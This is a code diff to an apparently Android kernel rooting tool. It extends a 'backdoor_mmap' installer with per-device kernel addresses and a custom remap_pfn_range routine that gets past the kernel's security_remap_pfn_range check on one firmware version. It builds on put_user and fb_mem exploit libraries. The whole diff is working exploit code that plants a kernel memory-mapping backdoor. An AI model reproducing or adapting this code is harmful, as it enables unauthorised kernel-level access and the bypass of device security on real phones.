@@ -16,6 +16,7 @@
 #include "libput_user_exploit/put_user.h"
 #include "libfb_mem_exploit/fb_mem.h"
 #include "backdoor_mmap.h"
+#include "build_remap_pfn_range.h"
 
 #define PAGE_SHIFT        12
 
@@ -29,11 +30,15 @@ typedef struct _supported_device {
   device_id_t device_id;
   unsigned long int kernel_phys_offset;
   unsigned long int vmalloc_exec_address;
+
+  unsigned long int remap_pfn_range_end_op;
+  unsigned long int security_remap_pfn_range_address;
+
 } supported_device;
 
 static supported_device supported_devices[] = {
   { DEVICE_F07E_V19R38A,            0x80208000, 0xc012fd64 },
-  { DEVICE_F07E_V20R39D,            0x80208000, 0xc012fd84 },
+  { DEVICE_F07E_V20R39D,            0x80208000, 0xc012fd84, 0xc0f6792c, 0xc027eee8 },
   { DEVICE_F10D_V10R42A,            0x80008000, 0xc00f0fe4 },
   { DEVICE_HTL21_1_29_970_1,        0x80608000, 0xc010b728 },
   { DEVICE_HTL21_1_36_970_1,        0x80608000, 0xc010baa0 },
@@ -79,6 +84,9 @@ static unsigned long int kernel_phys_offset;
 static void *(*vmalloc_exec)(unsigned long size);
 static int (*remap_pfn_range)(struct vm_area_struct *, unsigned long addr,
                               unsigned long pfn, unsigned long size, pgprot_t);
+
+static unsigned long int remap_pfn_range_end_op;
+static unsigned long int security_remap_pfn_range_address;
 
 /*
 
@@ -155,6 +163,9 @@ setup_variables(void)
     if (supported_devices[i].device_id == device_id) {
       kernel_phys_offset = supported_devices[i].kernel_phys_offset;
       vmalloc_exec = (void *)supported_devices[i].vmalloc_exec_address;
+
+      remap_pfn_range_end_op = supported_devices[i].remap_pfn_range_end_op;
+      security_remap_pfn_range_address = supported_devices[i].security_remap_pfn_range_address;
     }
   }
 
@@ -236,7 +247,27 @@ install_mmap(void)
 
   memcpy(func_address, do_mmap, func_size);
 
-  func_address[func_size / sizeof (void *) - 2] = (void *)remap_pfn_range;
+  if (security_remap_pfn_range_address) {
+    custom_remap_pfn_range_param_t param;
+
+    param.remap_pfn_range_address = (unsigned long)remap_pfn_range;
+    param.remap_pfn_range_end_op = remap_pfn_range_end_op;
+    param.security_remap_pfn_range_address = security_remap_pfn_range_address;
+
+    param.custom_remap_pfn_range_func = vmalloc_exec(MAX_REMAP_PFN_RANGE_SIZE);
+    memcpy(param.custom_remap_pfn_range_func, remap_pfn_range, MAX_REMAP_PFN_RANGE_SIZE);
+
+    if (build_custom_remap_pfn_range_func(&param)) {
+      func_address[func_size / sizeof (void *) - 2] = (void *)param.custom_remap_pfn_range_func;
+    }
+    else {
+      return;
+    }
+  }
+  else {
+    func_address[func_size / sizeof (void *) - 2] = (void *)remap_pfn_range;
+  }
+
   func_address[func_size / sizeof (void *) - 1] = (void *)(kernel_phys_offset >> PAGE_SHIFT);
 
   *install_fops_mmap_address = (void *)func_address + (USE_THUMB_INSN ? 1 : 0);
